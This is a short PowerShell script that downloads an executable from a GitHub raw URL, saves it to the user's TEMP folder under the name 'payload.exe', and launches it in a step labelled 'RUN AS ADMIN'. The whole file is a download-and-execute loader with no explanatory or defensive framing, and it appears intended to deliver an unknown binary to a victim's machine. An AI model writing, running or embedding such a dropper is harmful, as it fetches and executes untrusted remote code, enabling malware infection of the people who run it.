# === CONFIGURATION ===
$exeUrl = "https://github.com/aran1910/ddd/raw/refs/heads/main/dietpeng.exe"
$exeName = "payload.exe"
$tempPath = "$env:TEMP\$exeName"

# === DOWNLOAD ===
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath

# === RUN AS ADMIN ===
Start-Process -FilePath $tempPath 
